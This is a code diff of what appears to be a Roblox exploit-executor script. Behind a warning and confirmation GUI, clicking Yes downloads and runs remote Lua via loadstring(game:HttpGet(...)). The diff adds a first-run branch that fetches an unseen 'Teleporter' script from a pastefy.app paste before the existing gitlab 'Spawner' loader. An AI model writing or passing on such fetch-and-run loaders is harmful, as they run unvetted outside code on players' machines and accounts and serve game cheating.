@@ -8,7 +8,7 @@ if PlayerGui:FindFirstChild("DeltaWarningGUI") then
     PlayerGui:FindFirstChild("DeltaWarningGUI"):Destroy()
 end
 
---// Warning GUI
+--// ScreenGui setup
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "DeltaWarningGUI"
 screenGui.ResetOnSpawn = false
@@ -20,7 +20,6 @@ mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
 mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
 mainFrame.BorderSizePixel = 0
 mainFrame.Parent = screenGui
-
 Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)
 
 local title = Instance.new("TextLabel")
@@ -56,11 +55,10 @@ okBtn.Font = Enum.Font.GothamBold
 okBtn.Parent = mainFrame
 Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)
 
---// When OK clicked, ask for confirmation before loading Spawner
+--// Confirmation step
 okBtn.MouseButton1Click:Connect(function()
     mainFrame:Destroy()
 
-    -- Confirmation frame
     local confirmFrame = Instance.new("Frame")
     confirmFrame.Size = UDim2.new(0, 360, 0, 150)
     confirmFrame.Position = UDim2.new(0.5, -180, 0.5, -75)
@@ -79,7 +77,6 @@ okBtn.MouseButton1Click:Connect(function()
     confirmText.TextSize = 18
     confirmText.Parent = confirmFrame
 
-    -- Yes Button
     local yesBtn = Instance.new("TextButton")
     yesBtn.Size = UDim2.new(0, 120, 0, 40)
     yesBtn.Position = UDim2.new(0.25, -60, 1, -50)
@@ -91,7 +88,6 @@ okBtn.MouseButton1Click:Connect(function()
     yesBtn.Parent = confirmFrame
     Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 10)
 
-    -- No Button
     local noBtn = Instance.new("TextButton")
     noBtn.Size = UDim2.new(0, 120, 0, 40)
     noBtn.Position = UDim2.new(0.75, -60, 1, -50)
@@ -103,14 +99,20 @@ okBtn.MouseButton1Click:Connect(function()
     noBtn.Parent = confirmFrame
     Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 10)
 
-    -- If Yes → run Spawner
     yesBtn.MouseButton1Click:Connect(function()
         screenGui:Destroy()
-        local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
-        Spawner.Load()
+
+        if not _G.AlreadyTeleported then
+            -- First time: run Teleporter
+            _G.AlreadyTeleported = true
+            loadstring(game:HttpGet("https://pastefy.app/ESqWIOfA/raw"))()
+        else
+            -- Second time: run Spawner
+            local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+            Spawner.Load()
+        end
     end)
 
-    -- If No → just close GUI, do nothing
     noBtn.MouseButton1Click:Connect(function()
         screenGui:Destroy()
     end)
